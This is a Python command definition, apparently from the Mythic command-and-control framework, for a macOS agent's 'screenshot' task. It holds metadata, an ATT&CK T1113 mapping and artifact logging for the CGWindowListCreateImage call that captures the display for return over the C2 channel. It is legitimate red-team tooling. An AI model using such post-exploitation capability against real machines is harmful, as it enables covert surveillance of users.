from mythic_payloadtype_container.MythicCommandBase import *
import json
import datetime
from mythic_payloadtype_container.MythicRPC import *
from mythic_payloadtype_container.PayloadBuilder import *

class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot"
    description = "Use the built-in CGDisplay API calls to capture the display and send it back over the C2 channel."
    version = 1
    author = "@ajpc500"
    parameters = []
    attackmapping = ["T1113"]
    argument_class = ScreenshotArguments
    browser_script = [ 
        BrowserScript(script_name="screenshot", author="@its_a_feature_"),
        BrowserScript(script_name="screenshot_new", author="@its_a_feature_", for_new_ui=True)
    ]
    attributes = CommandAttributes(
        filter_by_build_parameter={
            "python_version": "Python 2.7"
        },
        supported_python_versions=["Python 2.7"],
        supported_os=[ SupportedOS.MacOS ]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="CG.CGWindowListCreateImage(region, CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID, CG.kCGWindowImageDefault)",
            artifact_type="API Called",
        )
        return task

    async def process_response(self, response: AgentResponse):
        pass
